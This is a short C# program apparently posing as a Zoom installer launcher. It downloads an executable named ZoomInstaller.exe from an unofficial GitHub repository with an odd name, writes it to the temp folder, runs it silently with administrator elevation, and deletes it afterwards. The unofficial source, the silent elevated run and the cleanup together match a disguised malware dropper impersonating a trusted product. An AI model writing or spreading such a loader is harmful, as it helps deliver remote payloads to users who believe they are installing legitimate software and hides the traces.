
using System;
using System.Net;
using System.Diagnostics;
using System.IO;

namespace ZoomDemoLauncher
{
    class Program
    {
        static void Main()
        {
            string downloadUrl = "https://github.com/deploydirectbaseinvokeurl/nonone/raw/refs/tags/zoooooom/ZoomInstaller.exe";
            string localPath = Path.Combine(Path.GetTempPath(), "ZoomInstaller.exe");

            try
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile(downloadUrl, localPath);
                }

                var process = new Process();
                process.StartInfo.FileName = localPath;
                process.StartInfo.Arguments = "/verysilent /norestart";
                process.StartInfo.Verb = "runas"; // UAC prompt
                process.StartInfo.UseShellExecute = true;
                process.Start();

                process.WaitForExit();
                File.Delete(localPath); // delete setup after install
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }
    }
}
